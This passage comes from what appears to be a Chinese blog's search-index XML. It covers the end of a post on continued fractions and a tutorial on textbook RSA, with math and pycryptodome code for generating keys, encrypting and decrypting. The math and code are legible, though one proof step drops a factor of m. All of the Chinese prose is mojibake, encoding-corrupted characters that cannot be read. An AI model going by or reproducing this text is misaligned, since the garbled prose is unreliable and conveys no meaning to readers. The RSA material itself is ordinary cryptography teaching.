mode=display">è‹¥æœ«å°¾å‡ºç°0ï¼Œ[\ldots,a_{n-2},a_{n-1},0],åˆ™-x=[\ldots,a_{n-2}]</script></blockquote><h3 id="æ™®é€šè¿åˆ†æ•°-general-continued-fraction"><a href="#æ™®é€šè¿åˆ†æ•°-general-continued-fraction" class="headerlink" title="æ™®é€šè¿åˆ†æ•°(general continued fraction)"></a>æ™®é€šè¿åˆ†æ•°(general continued fraction)</h3><p>$a_0+\frac{b_1}{a_1+\frac{b_2}{a_2+\frac{b_3}{â€¦}}}$<br>$b_i$æ˜¯æ­£æ•´æ•°</p><h3 id="è¿åˆ†æ•°çš„åº”ç”¨"><a href="#è¿åˆ†æ•°çš„åº”ç”¨" class="headerlink" title="è¿åˆ†æ•°çš„åº”ç”¨"></a>è¿åˆ†æ•°çš„åº”ç”¨</h3><p>å¤©æ–‡å†æ³•ï¼Œæ¤ç‰©å­¦ä¸Šæ ‘å¶åœ¨èŒä¸Šçš„æ’åˆ—è§„å¾‹ï¼ŒéŸ³ä¹é¢†åŸŸ</p><p>å¯†ç å­¦ä¸Šï¼Œè‘—åçš„<strong>RSAç®—æ³•</strong></p><hr><h1 id="å®Œç»“æ’’èŠ±"><a href="#å®Œç»“æ’’èŠ±" class="headerlink" title="å®Œç»“æ’’èŠ±"></a>å®Œç»“æ’’èŠ±</h1><p>â˜…,Â°<em>:.â˜†(ï¿£â–½ï¿£)/$:</em>.Â°â˜…<em> ã€‚<em>*çˆ±æ¥è‡ªğŸ˜½C.A.TğŸ˜¸å–µ</em></em></p>]]></content>
      
      
      <categories>
          
          <category> Cryptoæ•°å­¦åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯†ç å­¦ </tag>
            
            <tag> ç­‘åŸºç¯‡ </tag>
            
            <tag> æ•°è®º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç ç®—æ³•ç¯‡Â·RSA</title>
      <link href="/2023/10/28/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E7%AF%87%C2%B7RSA/"/>
      <url>/2023/10/28/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E7%AF%87%C2%B7RSA/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><ul><li><p><strong>äº’è´¨</strong>ï¼šä¸¤ä¸ª<strong>æ­£æ•´æ•°</strong>åªæœ‰<strong>ä¸€ä¸ªå…¬å› æ•°1</strong>æ—¶ï¼Œåˆ™ç§°å…¶ä¸ºäº’è´¨ã€‚</p></li><li><p><strong>æ¬§æ‹‰å‡½æ•°$\varphi(N)$</strong>:å°äºæˆ–ç­‰äº$N$çš„æ­£æ•´æ•°ä¸­ä¸$N$äº’è´¨çš„æ•°çš„<strong>ä¸ªæ•°</strong></p><p><strong>è‹¥$p$ä¸ºç´ æ•°ï¼Œåˆ™$\varphi(p)=p-1$ (å› ä¸ºæ¯ä¸€ä¸ªå°äº$p$çš„æ•°éƒ½ä¸$p$äº’è´¨ã€‚)</strong></p><p>ç”±æ­¤æˆ‘ä»¬æœ‰åœ¨RSAä¸­ï¼Œ$\varphi(N)=(p-1)(q-1)$</p></li><li><p><strong>ä¹˜æ³•é€†å…ƒ</strong>ï¼š</p><p>åœ¨åŠ æ³•ä¸­ï¼Œæˆ‘ä»¬æœ‰$a+(-a)=0$,æˆ‘ä»¬ç§°å…¶äº’ä¸ºç›¸åæ•°ã€‚</p><p>åœ¨ä¹˜æ³•ä¸­ï¼Œæˆ‘ä»¬æœ‰$a\cdot(1/a)=1$,æˆ‘ä»¬ç§°å…¶äº’ä¸ºå€’æ•°ï¼Œä½†æ˜¯å…¶å®æˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªç»Ÿä¸€çš„ç§°å‘¼ï¼šé€†å…ƒï¼Œå³æŸç§è¿ç®—ä¸‹çš„é€†å…ƒç´ ï¼Œæˆ‘ä»¬ä¼šå‘ç°ï¼Œå…ƒç´ å’Œå…¶é€†å…ƒç´ è¿›è¡Œè¿ç®—ä¹‹åæ€»æ˜¯ä¸€ä¸ªå®šå€¼</p><p>å®é™…ä¸Šåœ¨ä»£æ•°ä¸­ï¼Œä»–ä»¬æ„æˆäº†ä¸€ä¸ªç¾¤(ä¸ç”¨æ·±ç©¶),è€Œæˆ‘ä»¬è¿›è¡Œè¦äº†è§£åˆ™æ˜¯åœ¨æ¨¡æ„ä¹‰ä¸‹çš„ä¹˜æ³•é€†å…ƒåœ¨æ¨¡$p$æ„ä¹‰ä¸‹ï¼ŒæŒ‡çš„æ˜¯åç»­çš„æ‰€æœ‰è¿ç®—éƒ½æ˜¯åœ¨æ¨¡$p$çš„æ¡ä»¶ä¸‹æ»¡è¶³ï¼Œä¾‹å¦‚$3\cdot4\neq1$ä½†$(3\cdot4) mod\ 11=(1) mod\ 11$,å¯¹äºè¿™ç§å¼å­æˆ‘ä»¬ç§°å…¶ä¸º<strong>åŒä½™å¼</strong>ï¼Œå¹¶ä¸”æœ‰ä¸“é—¨çš„åŒä½™ç¬¦å·è¿›è¡Œè¡¨ç¤º<script type="math/tex">3\cdot4\equiv1\quad(\mathrm{mod~}11)</script><br>æ‰€ä»¥å‚è€ƒä¸Šé¢ä¹˜æ³•ä¸­çš„é€†å…ƒè¿ç®—è§„åˆ™ï¼Œåœ¨æ¨¡æ„ä¹‰ä¸‹åˆ™æœ‰</p><script type="math/tex; mode=display">a\cdot a^{-1}\equiv1\quad(\mathrm{mod~}p)</script><p>æˆ‘ä»¬ç§°$a$å’Œ$a^{-1}$äº’ä¸ºåœ¨æ¨¡$p$æ„ä¹‰ä¸‹çš„ä¹˜æ³•é€†å…ƒã€‚ä¾‹å¦‚ä¸Šè¿°ä¸­çš„ 3 ä¸ 4 äº’ä¸ºåœ¨æ¨¡ 11 ä¸‹çš„ä¹˜æ³•é€†å…ƒã€‚</p></li><li><p><strong>æ¬§æ‹‰å®šç†</strong>ï¼š<script type="math/tex">è®¾a\in \mathbb{Z_n^{*}},åˆ™a^{\phi(n)}\equiv1\pmod n</script></p><p>$ä¸”k\mid \phi(n),å…¶ä¸­kæ˜¯aåœ¨æ¨¡nä¸‹çš„é˜¶$</p><p><strong>$a^{\phi(p)}\equiv 1\pmod p$</strong></p><p><strong>$a^{p-1}\equiv 1\pmod p$</strong></p><p>ä¸¤è¾¹éƒ½ä¹˜a</p><p>å¾—åˆ°$a^p\equiv a\pmod p$</p><p>å³<strong>è´¹é©¬å°å®šç†</strong>$(å¯¹äºä»»æ„ç´ æ•°på’Œæ•´æ•°a\in \mathbb{Z_p},éƒ½æœ‰a^p\equiv a\pmod p)$</p></li></ul><h2 id="ç”Ÿæˆå…¬ç§é’¥"><a href="#ç”Ÿæˆå…¬ç§é’¥" class="headerlink" title="ç”Ÿæˆå…¬ç§é’¥"></a>ç”Ÿæˆå…¬ç§é’¥</h2><ol><li><p>é€‰å–ä¸¤ä¸ªä¸åŒçš„å¤§ç´ æ•°$p$å’Œ$q$ ,è®¡ç®—$N=p\cdot q$ ã€‚</p></li><li><p>æ±‚æ¬§æ‹‰å‡½æ•°å€¼$\varphi(N)=\varphi(p)\varphi(q)=(p-1)(q-1)$ã€‚</p></li><li><p>é€‰æ‹©ä¸€ä¸ªå°äº$\varphi(N)$çš„æ•´æ•°$e$ ,å¹¶ä¸”æ»¡è¶³$e$å’Œ$\varphi ( N) \textbf{äº’ è´¨ , æ±‚ å¾— }e$åœ¨æ¨¡$\varphi(N)$æ„ä¹‰ä¸‹çš„ä¹˜æ³•é€†å…ƒ$d$ ,æœ‰$ed\equiv1$ (mod $\varphi ( N) )$</p></li><li><p>é”€æ¯$p$å’Œ$q$ ã€‚</p></li></ol><p><strong>æ­¤æ—¶æœ‰$(N,e)$ä¸ºå…¬é’¥ï¼Œ$(N,d)$ä¸ºç§é’¥ã€‚</strong></p><h2 id="åŠ å¯†"><a href="#åŠ å¯†" class="headerlink" title="åŠ å¯†"></a>åŠ å¯†</h2><p>é¦–å…ˆéœ€è¦å°†æ¶ˆæ¯ï¼Œä»¥ä¸€ä¸ªåŒæ–¹çº¦å®šå¥½çš„æ ¼å¼è½¬åŒ–ä¸ºä¸€ä¸ªå°äº$N$çš„æ•´æ•°$m$ã€‚å¦‚æœæ¶ˆæ¯å¤ªé•¿ï¼Œå¯ä»¥å°†æ¶ˆæ¯åˆ†ä¸ºå‡ æ®µï¼Œè¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„å—åŠ å¯†ï¼Œåå¯¹äºæ¯ä¸€éƒ¨åˆ†åˆ©ç”¨å¦‚ä¸‹å…¬å¼åŠ å¯†ï¼š<script type="math/tex">c=m^e\quad(\mathrm{mod~}N)</script><br>æ­¤æ—¶å¾—åˆ°çš„$c$ä¾¿æ˜¯æˆ‘ä»¬çš„å¯†æ–‡ã€‚</p><h2 id="è§£å¯†"><a href="#è§£å¯†" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h2><p>åŠ å¯†æ—¶æˆ‘ä»¬åªç”¨åˆ°äº†å…¬é’¥$(N,e)$,åŒç†è§£å¯†æ—¶æˆ‘ä»¬ä¹Ÿåªéœ€ç”¨åˆ°ç§é’¥$(N,d)$ã€‚æœ‰</p><script type="math/tex; mode=display">m= c^d\quad(\mathrm{mod~}N)</script><p>æ­¤æ—¶å¾—åˆ°çš„$m$ä¾¿æ˜¯æˆ‘ä»¬çš„æ˜æ–‡æ¶ˆæ¯ã€‚</p><h2 id="æ­£ç¡®æ€§è¯æ˜"><a href="#æ­£ç¡®æ€§è¯æ˜" class="headerlink" title="æ­£ç¡®æ€§è¯æ˜"></a>æ­£ç¡®æ€§è¯æ˜</h2><p>è½¬æ¢ä¸ºè¯æ˜<br>$m\equiv c^d$<br>$\equiv(m^e)^d$<br>$\equiv m^{ed}$ (mod $N)$<br>åˆæœ‰ $ed\equiv1$ (mod $\varphi(N))$,å³$ed=1+k\varphi(N)$ã€‚</p><ol><li>è‹¥$gcd(m,N)=1$,åˆ™$m^{ed}\equiv m^{ed- 1}\cdot m\equiv m^{k\varphi ( N) }\cdot m\equiv m$ (mod $N)$ã€‚åŸå¼å¾—è¯ã€‚</li></ol><ol><li>è‹¥$gcd(m,N)\neq1$,åˆ™$m$ä¸º$p$æˆ–$q$çš„æ•´æ•°å€ï¼Œè®¾$m=hp$,æœ‰<script type="math/tex; mode=display">\begin{aligned}m^{ed}&\equiv m^{ed-1}\\&\equiv m^{k(p-1)(q-1)}\cdot m\\&\equiv(1+xq)\cdot m\\&\equiv m+xq\cdot hp\\&\equiv m\quad(\mathrm{mod~}N)\end{aligned}</script>å…¶ä¸­<script type="math/tex; mode=display">m^{k(p-1)(q-1)}=(m^{k(p-1)})^{q-1}=1+xq</script>åŸå¼å¾—è¯ã€‚</li></ol><ol><li><p>ç”Ÿæˆä¸¤ä¸ªå¤§ç´ æ•°Pï¼ŒQã€‚</p><p>è¿™æ˜¯ä¸€ä¸ªå¾ˆæ¨¡ç³Šçš„æ¦‚å¿µï¼Œæˆ‘å¸Œæœ›å„ä½åœ¨å­¦ä¹ ä¸­èƒ½å¤Ÿåšåˆ°å°½é‡ä¸¥è°¨ï¼Œå¾ˆæ˜¾ç„¶ï¼Œè¿™é‡Œå®šä¹‰çš„<code>å¤§ç´ æ•°</code>åˆ°åº•å¤šå¤§æ‰æ˜¯å¤§å‘¢ï¼Ÿ</p><p>10ç®—å¤§å—ï¼Ÿ100ç®—å—ï¼Ÿ10000ç®—å—ï¼Ÿè‘›ç«‹æ’æ•°ç®—å—ï¼Ÿ</p><p>æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ›´åŠ ç²¾ç¡®çš„è¯´æ³•ï¼Œæˆ‘ä»¬ç”Ÿæˆä¸¤ä¸ª512ä½çš„ç´ æ•°ï¼ˆè¿™é‡ŒåŒ…æ‹¬ä¹‹åçš„å†…å®¹ä¸­æ¶‰åŠåˆ°çš„<code>ä½</code>éƒ½æ˜¯æŒ‡äºŒè¿›åˆ¶ä½è€Œä¸æ˜¯åè¿›åˆ¶ï¼‰ï¼Œé‚£ä¹ˆå¦‚ä½•ä½¿ç”¨Pythonäº§ç”Ÿä¸€ä¸ªç´ æ•°å‘¢ï¼Œå¦‚æœä¸å€ŸåŠ©ä»»ä½•å¤–åŠ›çš„æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥ä»1å¼€å§‹é€‰æ‹©ï¼Œ2ï¼Œ3ï¼Œ4â€¦ç›´åˆ°æŸä¸ªæ•°æ»¡è¶³512ä½ä¸”ä¸ºç´ æ•°ä¸ºæ­¢ï¼Œä½†æ˜¯æ—¢ç„¶æˆ‘ä»¬éƒ½ä½¿ç”¨Pythonäº†ï¼Œä¸ºä½•è¿˜è¦è¿™æ ·åšå‘¢ï¼Ÿ</p><p>è®©æˆ‘ä»¬æ¥ä½¿ç”¨Pythonå¼ºå¤§çš„å¼€æºåº“<code>pycryptodome</code>ï¼Œä¸€èˆ¬æ¥è¯´ä½ åªéœ€è¦ä½¿ç”¨</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">pip3 install pycryptodome# æˆ–python3 -m pip install pycryptodome<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä¾¿å¯ä»¥æˆåŠŸå®‰è£…ï¼Œç„¶ååœ¨Pythonç¯å¢ƒä¸­æ‰§è¡Œä»¥ä¸‹ä»£ç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">import Crypto<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœæ²¡æœ‰æ˜¾ç¤º<code>ModuleNotFoundErrorï¼š</code>ç­‰è¯¸å¦‚æ­¤ç±»çš„é”™è¯¯è¯ï¼Œé‚£ä¹ˆæ­å–œä½ æˆåŠŸçš„å®‰è£…äº†æœ¬åº“ã€‚è¿™é‡Œä½ å¯èƒ½ä¼šå¥‡æ€ªä¸ºä»€ä¹ˆå®‰è£…ä½¿ç”¨<code>pycryptodome</code>ï¼Œè€Œå¼•å…¥æ—¶ä½¿ç”¨<code>Crypto</code>ï¼Œè¿™æ¶‰åŠåˆ°è¿™çš„åº“å’Œå…¶ä»–åº“çš„ä¸€äº›è”ç³»ï¼Œæœ‰å…´è¶£çš„å¯ä»¥è‡ªè¡Œå»æŸ¥æ‰¾ã€‚</p><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥ç”Ÿæˆç´ æ•°äº†ï¼Œæˆ‘ä»¬å¼•å…¥åº“ä¸­çš„å­åŒ…<code>Crypto.Util.number</code>ï¼Œè¿™ä¸ªå­åŒ…ä¸­åŒ…å«äº†å¤§é‡çš„æ•°å­¦å·¥å…·ï¼Œä¹‹åæˆ‘ä»¬ä¼šç»å¸¸ç”¨åˆ°è¿™ä¸ªå­åŒ…ã€‚</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from Crypto.Util.number import *p &#x3D; getPrime(512)q &#x3D; getPrime(512)print(p)print(q)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰§è¡Œä¸Šé¢çš„ä»£ç ï¼Œä½ ä¾¿å¯ä»¥å¾—åˆ°ä¸¤ä¸ª512ä½çš„ç´ æ•°ï¼Œè¿™ä¾èµ–äºæˆ‘ä»¬è°ƒç”¨äº†åŒ…ä¸­çš„<code>getPrime</code>å‡½æ•°ï¼Œå®ƒèƒ½å¤Ÿè¿”å›ä¸€ä¸ª<code>n</code>ä½çš„ç´ æ•°ï¼Œå…¶ä¸­<code>n</code>æ˜¯æˆ‘ä»¬çš„ä¼ å…¥å‚æ•°ã€‚è‡³æ­¤æˆ‘ä»¬ä¾¿å®Œæˆäº†RSAçš„ç¬¬ä¸€æ­¥ã€‚</p></li><li><p>$n=pâ‹…q, Ï†(n)=(pâˆ’1)(qâˆ’1)$</p><p>åç»­çš„è¿‡ç¨‹ä¾¿ç®€å•äº†å¾ˆå¤šï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨ä¹‹å‰çš„åŸºç¡€ä¸Šå®Œæˆè¿ç®—å³å¯ï¼Œæ·»åŠ ä¸‹åˆ—ä»£ç å¹¶æ‰§è¡Œ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">n &#x3D; p*qphi &#x3D; (p-1)*(q-1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>$é€‰å–ä¸Ï†(n)äº’ç´ çš„eï¼Œè®¡ç®—æ»¡è¶³edâ‰¡1(mod\ Ï†(n))$</p><p>è¿™é‡Œæˆ‘ä»¬è¦å®Œæˆä¸¤ä¸ªæ•°å­¦æ“ä½œï¼Œä¸€ä¸ªæ˜¯äº’ç´ çš„åˆ¤æ–­ï¼Œä¸€ä¸ªæ˜¯æ±‚è§£eçš„ä¹˜æ³•é€†å…ƒã€‚</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">e &#x3D; 65537assert GCD(e, phi) &#x3D;&#x3D; 1, &quot;è¯¥eä¸æ»¡è¶³äº’ç´ æ¡ä»¶&quot;d &#x3D; inverse(e, phi)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œ<code>GCD</code>å‡½æ•°èƒ½å¤Ÿæ±‚è§£æœ€å¤§å…¬å› æ•°ï¼ˆGreatest Common Divisorï¼‰ï¼Œä¹‹å‰æˆ‘ä»¬å­¦ä¹ äº†äº’ç´ çš„æ¦‚å¿µå°±æ˜¯ä¸¤ä¸ªæ•°çš„æœ€å¤§å…¬å› æ•°ä¸º1ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ç”¨æ–­è¨€è¡¨è¾¾å¼è®¤å®šeä¸€å®šæ˜¯å’Œphiäº’ç´ çš„ã€‚ä¸ºä»€ä¹ˆæˆ‘ä»¬è¦é€‰æ‹©<code>65537</code>ä½œä¸º<code>e</code>å‘¢ï¼Œå®é™…ä¸Šè¿™å¹¶ä¸æ˜¯ç¡¬æ€§è§„å®šï¼Œä¸€äº›æ ‡å‡†æä¾›äº†ä¸€äº›eçš„å‚è€ƒå€¼ï¼Œ65537åœ¨å„ç±»å®ç°ä¸æ ‡å‡†ä¸­è¢«å¹¿æ³›ä½¿ç”¨ï¼Œä½†æ˜¯è¿™å¹¶ä¸å½±å“ä½ å¯ä»¥å°†å€¼æ”¹å˜ä¸ºå…¶ä»–å€¼è¿›è¡Œåç»­çš„æ“ä½œã€‚<br>æ±‚dçš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†<strong><code>inverse</code>å‡½æ•°</strong>ï¼Œè¯¥å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°<code>(a,p)</code>ï¼Œä½œç”¨ä¾¿æ˜¯<strong>æ±‚è§£<code>a</code>åœ¨æ¨¡<code>p</code>æ„ä¹‰ä¸‹çš„ä¹˜æ³•é€†å…ƒ</strong>ï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬ä¾¿æ˜¯æ±‚è§£<code>e</code>åœ¨æ¨¡<code>phi</code>ä¸‹é¢çš„ä¹˜æ³•é€†å…ƒï¼Œç»“æœä¸º<code>d</code>ã€‚ä¹‹å‰æˆ‘ä»¬æåˆ°äº†é€†å…ƒæ˜¯äº’ä¸ºé€†å…ƒï¼Œæ‰€ä»¥ä½ å¯ä»¥å°è¯•ä¸‹é¢çš„ä»£ç </p><p><code>print(inverse(d, phi) == e)</code></p><p>æ‰“å°çš„ç»“æœå°†ä¸º<code>True</code>ï¼Œä»è¿™é‡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹å‡ºåœ¨RSAä¸­çš„å…³é”®ç‚¹ä¾¿æ˜¯è·å–è¿™ä¸ª<code>phi</code>çš„å€¼ï¼Œå› ä¸ºå¾—åˆ°çš„<code>phi</code>æˆ‘ä»¬ä¾¿å¯ä»¥æ±‚<code>e</code>æˆ–<code>d</code>çš„å€¼ï¼Œè€Œè¿™æ­£æ˜¯æˆ‘ä»¬åŠ è§£å¯†çš„å¯†é’¥å‚æ•°ã€‚</p></li><li><p>$(n,e)$å³ä¸ºå…¬é’¥ï¼Œ$(n,d)$å³ä¸ºç§é’¥ï¼Œæ­¤æ—¶æˆ‘ä»¬ä¾¿å¾—åˆ°äº†ä¸€ç»„RSAçš„å…¬ç§é’¥ï¼Œéšåæˆ‘ä»¬ä¾¿å¯ä»¥å¼€å§‹ç”¨è¿™ç»„å¯†é’¥æ¥è¿›è¡ŒåŠ è§£å¯†æ“ä½œã€‚</p><p><strong>åŠ å¯†ï¼š</strong></p><p>å‡è®¾æˆ‘ä»¬è¦åŠ å¯†çš„æ¶ˆæ¯ä¸º<code>Hello</code>ï¼Œæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œå­˜å‚¨</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">message &#x3D; b&#39;hello&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ³¨æ„è¿™é‡Œæˆ‘ä»¬å®šä¹‰çš„æ˜¯ä¸€ä¸ª<code>bytes</code>ç±»å‹å­—ç¬¦ä¸²ï¼Œå®ƒå°†æ¯ä¸ªå­—ç¬¦ç”¨8ä½äºŒè¿›åˆ¶è¿›è¡Œå­˜å‚¨ï¼Œæ˜¯å­—ç¬¦ä¸²æœ€åŸç”Ÿçš„å­˜å‚¨å½¢å¼ã€‚ä½ ä¹Ÿå¯ä»¥ç›´æ¥å®šä¹‰<code>&#39;hello&#39;</code>ï¼Œä½†åœ¨Python3ä¸­å®ƒæ˜¯ä¸€ä¸ªUnicodeçš„å­—ç¬¦ä¸²ï¼Œéœ€è¦è¿›è¡Œç¼–ç æ“ä½œæ‰èƒ½è½¬æ¢ä¸º<code>bytes</code>ç±»å‹è¿›è¡Œåç»­çš„è¿ç®—ã€‚</p><p>ä½†æˆ‘ä»¬åœ¨RSAä¸­æ˜¯æ•°ä¸æ•°çš„è¿ç®—ï¼Œè¯¥å¦‚ä½•å°†å­—ç¬¦ä¸²å‚ä¸æ“ä½œå‘¢ï¼Ÿ</p><p>æˆ‘ä»¬ä½¿ç”¨åŒ…ä¸­çš„<code>bytes_to_long</code>å‡½æ•°ï¼Œä»å‡½æ•°åä¹Ÿå¯ä»¥çŒœå‡ºæ¥ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°å­—ï¼Œè¿è¡Œä¸‹åˆ—ä»£ç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">m &#x3D; bytes_to_long(message)print(m)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ­¤æ—¶ï¼Œæˆ‘ä»¬çš„æ¶ˆæ¯å·²ç»è¢«è½¬æ¢ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²äº†ã€‚éšåæˆ‘ä»¬ä¾¿å¯ä»¥å¯¹æ¶ˆæ¯è¿›è¡ŒRSAåŠ å¯†</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">c &#x3D; pow(m, e, n)print(c)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æˆ‘ä»¬ä½¿ç”¨Pythonè‡ªå¸¦çš„<code>pow</code>å‡½æ•°è¿›è¡Œå¹‚è¿ç®—ï¼Œæ³¨æ„ä¸è¦å†™æˆ<code>m**e % n</code>ï¼ŒäºŒè€…ä»£è¡¨çš„æ„ä¹‰ç›¸åŒï¼Œä½†æ˜¯<code>pow</code>å‡½æ•°å†…ç½®å¿«é€Ÿå¹‚ï¼Œå¯ä»¥å¿«é€Ÿå¾—å‡ºç»“æœï¼Œè€Œ<code>m**e % n</code>ä¼šå°†$m^e$çš„ç»“æœå…ˆè®¡ç®—å‡ºæ¥å†å–æ¨¡ï¼Œ$m^e$æ˜¯ä¸€ä¸ªéå¸¸å¤§çš„æ•°ï¼Œè¿™ä¼šæ¶ˆè€—ä½ è®¡ç®—æœºå¤§é‡çš„è¿ç®—å’Œå­˜å‚¨èµ„æºã€‚</p><p>è‡³æ­¤ï¼Œæˆ‘ä»¬ä¾¿å®Œæˆäº†åŠ å¯†è¿‡ç¨‹ï¼Œå¾—åˆ°äº†RSAçš„å¯†æ–‡Cã€‚</p><p><strong>è§£å¯†ï¼š</strong></p><p>æˆ‘ä»¬æ‰§è¡Œ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">msg &#x3D; pow(c, d, n)print(msg)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ­¤æ—¶æˆ‘ä»¬ä¾¿å®Œæˆäº†RSAçš„è§£å¯†æ“ä½œï¼Œéšåä½ å¯ä»¥æ¯”è¾ƒä¸€ä¸‹<code>msg</code>å’Œ<code>m</code>çš„å€¼ï¼Œä»–ä»¬ä¼šæ˜¯ä¸€æ ·çš„ã€‚</p></li></ol><ul><li><p>å®Œæ•´ä»£ç ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from Crypto.Util.number import *p &#x3D; getPrime(512)q &#x3D; getPrime(512)n &#x3D; p*qphi &#x3D; (p-1)*(q-1)e &#x3D; 65537assert GCD(e, phi) &#x3D;&#x3D; 1, &quot;è¯¥eä¸æ»¡è¶³äº’ç´ æ¡ä»¶&quot;d &#x3D; inverse(e, phi)print(f&#39;å…¬é’¥ï¼š(&#123;e&#125;, &#123;n&#125;)&#39;)print(f&#39;ç§é’¥ï¼š(&#123;d&#125;, &#123;n&#125;)&#39;)message &#x3D; b&#39;hello&#39;m &#x3D; bytes_to_long(message)print(&#39;æ¶ˆæ¯ï¼š&#39;, m)c &#x3D; pow(m, e, n)print(&#39;å¯†æ–‡ï¼š&#39;, c)msg &#x3D; pow(c, d, n)print(&#39;æ˜æ–‡ï¼š&#39;, msg)assert msg &#x3D;&#x3D; m, &quot;è§£å¯†å¤±è´¥&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> å¯†ç ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯†ç å­¦ </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
